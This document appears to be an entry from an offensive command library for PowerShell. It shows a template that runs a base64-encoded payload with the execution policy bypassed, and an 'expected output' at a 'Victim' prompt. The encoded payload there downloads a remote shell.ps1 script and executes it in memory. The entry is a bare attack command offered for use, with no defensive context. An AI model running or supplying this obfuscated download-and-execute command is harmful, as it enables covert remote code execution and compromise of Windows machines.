---
id: c347500b-4150-463a-811d-877b10d02dfc
name: PowerShell Execute a Base64 Encoded Command
type: command
executor: powershell
data: powershell -ep bypass -enc $_PAYLOAD.b64
output: PS C:\Users\Victim> powershell -ep bypass -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADUANgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
created_at: '2019-11-13T23:32:45.206600+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# PowerShell Execute a Base64 Encoded Command

```powershell
powershell -ep bypass -enc $_PAYLOAD.b64
```

## Expected Output

```
PS C:\Users\Victim> powershell -ep bypass -enc aQBlAHgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADUANgAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=
```


